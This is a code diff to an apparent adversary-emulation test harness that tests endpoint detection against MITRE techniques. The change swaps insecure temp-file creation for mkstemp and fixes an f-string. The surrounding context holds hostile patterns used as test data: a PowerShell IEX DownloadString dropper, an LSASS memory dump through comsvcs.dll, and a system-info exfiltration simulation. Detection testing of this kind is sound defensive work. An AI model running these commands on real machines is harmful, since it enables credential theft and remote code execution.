@@ -100,7 +100,8 @@ def _test_T1059_001():
     # The payload string mirrors a real-world dropper pattern.
     # It writes a benign EICAR-equivalent marker to a temp file
     # so we have a measurable disk artefact to check.
-    marker = tempfile.mktemp(suffix=".txt", prefix="ps_exec_")
+    marker_fd, marker = tempfile.mkstemp(suffix=".txt", prefix="ps_exec_")
+    os.close(marker_fd)
 
     script = (
         f"$c='IEX (New-Object Net.WebClient).DownloadString'; "
@@ -154,7 +155,8 @@ def _test_T1003_001():
     if lsass_pid is None:
         return True, "Could not resolve LSASS PID (process blocked or AV intervention)"
 
-    dump_path = tempfile.mktemp(suffix=".dmp", prefix="lsass_dump_")
+    dump_fd, dump_path = tempfile.mkstemp(suffix=".dmp", prefix="lsass_dump_")
+    os.close(dump_fd)
     comsvcs = r"C:\Windows\System32\comsvcs.dll"
     args = [
         "rundll32.exe", comsvcs,
@@ -208,7 +210,8 @@ def _test_T1105():
     print("[Atomic] T1105 — Ingress Tool Transfer (EICAR .exe download)")
 
     eicar_url = "https://secure.eicar.org/eicar.com.txt"
-    out_path   = tempfile.mktemp(suffix=".exe", prefix="eicar_download_")
+    out_fd, out_path = tempfile.mkstemp(suffix=".exe", prefix="eicar_download_")
+    os.close(out_fd)
 
     try:
         req = urllib.request.Request(
@@ -259,7 +262,8 @@ def _test_T1082():
     """
     print("[Atomic] T1082 — System Discovery + Exfil Simulation")
 
-    staging_file = tempfile.mktemp(suffix=".txt", prefix="sysinfo_stage_")
+    stage_fd, staging_file = tempfile.mkstemp(suffix=".txt", prefix="sysinfo_stage_")
+    os.close(stage_fd)
 
     # 1. Recon
     rc, sysinfo_out, _ = _run_proc(
@@ -269,7 +273,7 @@ def _test_T1082():
 
     if not discovered:
         # Systeminfo blocked — that itself is a detection signal
-        print("[Atomic]   -> systeminfo blocked (rc={rc})")
+        print(f"[Atomic]   -> systeminfo blocked (rc={rc})")
         return True, f"systeminfo execution blocked (rc={rc})"
 
     # 2. Stage: base64-encode
